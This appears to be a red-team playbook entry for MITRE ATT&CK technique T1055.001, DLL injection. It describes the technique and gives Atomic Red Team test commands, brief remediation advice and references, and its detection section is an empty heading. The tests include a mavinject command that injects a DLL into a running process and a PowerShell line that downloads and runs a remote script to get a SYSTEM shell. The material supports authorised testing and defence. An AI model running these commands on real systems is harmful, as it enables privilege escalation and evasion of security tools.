---
name: "T1055.001_dynamic-link-library-injection"
description: "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1055.001
  - defense-evasion
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1055.001"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1055/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1055
  - T1055.002
  - T1055.003
  - T1055.004
  - T1055.005
  - T1055.008
  - T1055.009
  - T1055.011
  - T1055.012
  - T1055.013
  - T1055.014
  - T1055.015
prerequisites:
  - T1055
severity_boost:
  T1055: "Chain with T1055 for deeper attack path"
  T1055.002: "Chain with T1055.002 for deeper attack path"
  T1055.003: "Chain with T1055.003 for deeper attack path"
---

# T1055.001 Dynamic-link Library Injection

> **Sub-technique of:** T1055

## High-Level Description

Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).

Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Dynamic-link Library Injection technique is applicable to target environment
- [ ] Check Windows systems for indicators of Dynamic-link Library Injection
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Process Injection via mavinject.exe

Windows 10 Utility To Inject DLLS.

Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING "#{dll_payload}"
Stop-Process -processname notepad
```

**Dependencies:**

- Utility to inject must exist on disk at specified location (#{dll_payload})

### Atomic Test 2: WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique

Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Dynamic-link Library Injection by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1055.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1040 Behavior Prevention on Endpoint

Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process.

## Detection

### Behavioral Detection of DLL Injection via Windows API

## Risk Assessment

| Finding                                             | Severity | Impact          |
| --------------------------------------------------- | -------- | --------------- |
| Dynamic-link Library Injection technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [Hiding Malicious Code with Module Stomping](https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/)
- [Elastic HuntingNMemory June 2017](https://www.endgame.com/blog/technical-blog/hunting-memory)
- [Elastic Process Injection July 2017](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [Module Stomping for Shellcode Injection](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection)
- [Atomic Red Team - T1055.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1055.001)
- [MITRE ATT&CK - T1055.001](https://attack.mitre.org/techniques/T1055/001)
